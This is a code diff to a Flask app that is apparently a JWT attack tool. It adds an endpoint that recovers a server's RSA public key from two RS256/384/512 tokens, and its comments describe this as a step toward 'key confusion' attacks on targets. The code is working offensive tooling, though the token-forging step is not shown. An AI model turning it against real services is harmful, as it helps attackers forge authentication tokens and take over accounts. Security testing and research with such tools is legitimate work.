@@ -471,25 +471,30 @@ def fetch_jwks_kids():
     return jsonify({"kids": kids})
 
 
-def _jwk_to_pem(jwk):
-    """Convert a single RSA JWK (its n/e fields) into a PEM public key,
-    the same conversion jwt.io's "JWK to PEM" box does. Only RSA is
-    supported since that's what Key confusion needs (the HMAC secret for
-    that attack is the server's RSA *public* key's bytes)."""
-    if jwk.get("kty") != "RSA":
-        raise ValueError(f'kty is "{jwk.get("kty")}", only RSA JWKs can be converted to PEM')
-    n_b64, e_b64 = jwk.get("n"), jwk.get("e")
-    if not n_b64 or not e_b64:
-        raise ValueError("JWK is missing n or e")
+def _rsa_numbers_to_pem(n, e):
+    """Build a PEM public key straight from the (n, e) integers, the same
+    math jwt.io's own "JWK to PEM" box does."""
     from cryptography.hazmat.primitives.asymmetric import rsa
     from cryptography.hazmat.primitives import serialization
-    n = int.from_bytes(b64url_decode(n_b64), "big")
-    e = int.from_bytes(b64url_decode(e_b64), "big")
     public_key = rsa.RSAPublicNumbers(e, n).public_key()
     return public_key.public_bytes(
         encoding=serialization.Encoding.PEM,
         format=serialization.PublicFormat.SubjectPublicKeyInfo,
     ).decode()
+
+
+def _jwk_to_pem(jwk):
+    """Convert a single RSA JWK (its n/e fields) into a PEM public key.
+    Only RSA is supported since that's what Key confusion needs (the HMAC
+    secret for that attack is the server's RSA *public* key's bytes)."""
+    if jwk.get("kty") != "RSA":
+        raise ValueError(f'kty is "{jwk.get("kty")}", only RSA JWKs can be converted to PEM')
+    n_b64, e_b64 = jwk.get("n"), jwk.get("e")
+    if not n_b64 or not e_b64:
+        raise ValueError("JWK is missing n or e")
+    n = int.from_bytes(b64url_decode(n_b64), "big")
+    e = int.from_bytes(b64url_decode(e_b64), "big")
+    return _rsa_numbers_to_pem(n, e)
 
 
 @app.route("/api/fetch-pubkey", methods=["POST"])
@@ -558,6 +563,146 @@ def fetch_pubkey():
         )
 
     return jsonify({"pem": pem, "note": note})
+
+
+# RSA PKCS#1 v1.5 DigestInfo ASN.1 prefixes (RFC 8017), used below to
+# rebuild exactly what a signer hashes and pads before raising it to the
+# power e mod n. Only RS256/384/512 use this deterministic padding; PS*
+# (RSASSA-PSS) salts every signature randomly, so two PSS signatures don't
+# give you the same clean algebraic relationship and can't be attacked
+# this way.
+_PKCS1V15_DIGESTINFO = {
+    "sha256": bytes.fromhex("3031300d060960864801650304020105000420"),
+    "sha384": bytes.fromhex("3041300d060960864801650304020205000430"),
+    "sha512": bytes.fromhex("3051300d060960864801650304020305000440"),
+}
+_ALG_TO_HASH = {"RS256": "sha256", "RS384": "sha384", "RS512": "sha512"}
+
+
+def _pkcs1v15_padded_int(signing_input, hash_name, key_bytes):
+    digest = hashlib.new(hash_name, signing_input).digest()
+    digest_info = _PKCS1V15_DIGESTINFO[hash_name] + digest
+    pad_len = key_bytes - len(digest_info) - 3
+    if pad_len < 8:
+        return None
+    em = b"\x00\x01" + b"\xff" * pad_len + b"\x00" + digest_info
+    return int.from_bytes(em, "big")
+
+
+@app.route("/api/recover-pubkey", methods=["POST"])
+@auth_required
+@rate_limited
+def recover_pubkey():
+    # Key confusion needs the server's RSA public key, but plenty of
+    # targets never expose one anywhere at all. If you have two tokens it
+    # signed with RS256/384/512, you don't need it exposed: that padding
+    # is deterministic, so for two genuine (message, signature) pairs
+    # under the same key, n divides BOTH (sig1^e - padded_hash1) and
+    # (sig2^e - padded_hash2) exactly, and in practice their GCD IS n.
+    # This is the standard "recover an RSA public key from two signatures"
+    # technique (the same one the well-known rsa_sign2n tool automates).
+    # It needs gmpy2 to be fast enough to be usable: sig**65537 is a real,
+    # ~17 MB integer for a 2048-bit key, and CPython's own bignum GCD on
+    # numbers that size is impractically slow (minutes to effectively
+    # never finishes), while GMP's does it in well under a minute.
+    try:
+        import gmpy2
+    except ImportError:
+        return jsonify({
+            "error": "This needs the gmpy2 library installed on the server "
+                     "(pip install gmpy2). Without it, the math here is too "
+                     "slow to be usable (CPython's own big-integer GCD can "
+                     "take many minutes on numbers this size)."
+        }), 500
+
+    data = request.json or {}
+    token1 = data.get("token1", "").strip()
+    token2 = data.get("token2", "").strip()
+    key_sizes = data.get("key_sizes") or [256]  # bytes; 256 = 2048-bit, by far the most common
+
+    if not token1 or not token2:
+        return jsonify({"error": "Both tokens are required"}), 400
+    if token1 == token2:
+        return jsonify({"error": "Those are the same token twice, two DIFFERENT tokens signed with the same key are needed"}), 400
+
+    def split_token(tok, label):
+        parts = tok.split(".")
+        if len(parts) != 3:
+            raise ValueError(f"{label} doesn't look like a JWT (expected 3 parts)")
+        try:
+            header = json.loads(b64url_decode(parts[0]))
+        except Exception as exc:
+            raise ValueError(f"{label}: could not decode header: {exc}")
+        alg = header.get("alg", "")
+        if alg not in _ALG_TO_HASH:
+            raise ValueError(
+                f'{label} uses alg "{alg}", only RS256/RS384/RS512 can be attacked this way '
+                "(PS256/384/512 randomize their padding, there's no key to recover from those)"
+            )
+        signing_input = f"{parts[0]}.{parts[1]}".encode()
+        try:
+            sig = int.from_bytes(b64url_decode(parts[2]), "big")
+        except Exception as exc:
+            raise ValueError(f"{label}: could not decode signature: {exc}")
+        return alg, signing_input, sig
+
+    try:
+        alg1, si1, sig1 = split_token(token1, "Token 1")
+        alg2, si2, sig2 = split_token(token2, "Token 2")
+    except ValueError as exc:
+        return jsonify({"error": str(exc)}), 400
+
+    if alg1 != alg2:
+        return jsonify({"error": f"Token 1 is {alg1} but Token 2 is {alg2}, both need the same algorithm"}), 400
+    if sig1 == sig2:
+        return jsonify({"error": "Those two tokens have the same signature, they need genuinely different signed content"}), 400
+
+    hash_name = _ALG_TO_HASH[alg1]
+    e = 65537  # the near-universal default exponent; not configurable here
+    mpz = gmpy2.mpz
+    s1e = mpz(sig1) ** e  # exact, non-modular power: the whole trick needs this
+    s2e = mpz(sig2) ** e
+
+    tried_bits = []
+    for key_bytes in key_sizes:
+        m1 = _pkcs1v15_padded_int(si1, hash_name, key_bytes)
+        m2 = _pkcs1v15_padded_int(si2, hash_name, key_bytes)
+        if m1 is None or m2 is None:
+            continue
+        tried_bits.append(key_bytes * 8)
+
+        g = gmpy2.gcd(s1e - mpz(m1), s2e - mpz(m2))
+        if g == 0:
+            continue
+        n_candidate = g
+        for small in (2, 3, 5, 7, 11, 13, 17, 19, 23):
+            while n_candidate % small == 0:
+                n_candidate //= small
+        expected_bits = key_bytes * 8
+        if abs(int(n_candidate).bit_length() - expected_bits) > 8:
+            continue
+
+        n_candidate = int(n_candidate)
+        # Sanity-check it actually verifies BOTH signatures before trusting it,
+        # rather than handing back a GCD artifact that happens to be the
+        # right size but isn't really the modulus.
+        if pow(sig1, e, n_candidate) == m1 % n_candidate and pow(sig2, e, n_candidate) == m2 % n_candidate:
+            try:
+                pem = _rsa_numbers_to_pem(n_candidate, e)
+            except Exception as exc:
+                return jsonify({"error": f"Recovered a modulus but couldn't turn it into a PEM: {exc}"}), 400
+            return jsonify({
+                "pem": pem,
+                "note": f"Recovered the {expected_bits}-bit RSA public key from these two tokens "
+                        f"(e={e}), verified against both signatures.",
+            })
+
+    sizes_desc = ", ".join(f"{b}-bit" for b in tried_bits) if tried_bits else "none (nothing selected)"
+    return jsonify({
+        "error": f"Couldn't recover a key at {sizes_desc}. Either these two tokens weren't signed "
+                 "with the same RSA key, the key uses a different exponent than 65537, or it's a "
+                 "key size not tried here, select more sizes and try again."
+    }), 400
 
 
 @app.route("/api/exploit", methods=["POST"])
